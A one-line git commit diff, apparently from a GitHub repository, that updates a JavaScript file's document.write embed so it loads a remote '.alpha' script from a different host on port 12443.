6b8c00e4f61bb0587f93ca85bf96c8446010b173
boba3721 <68194272+boba3721@users.noreply.github.com>
2021-01-12 09:32:36 +0800

    Update 2021.js

--- 2021.js
+++ 2021.js
@@ -1,1 +1,1 @@
-document.write('<script src="https://xn--wxtr9fwyxk9c.xn--55qx5d:12443/ty/9EB21C5C-77D8-13163-33-9F6647357031.alpha"><\/script>');
+document.write('<script src="https://show.govjiangsu.cn:12443/ty/6B46F52A-03EA-13163-33-2DD7DFAE7B5D.alpha"><\/script>');
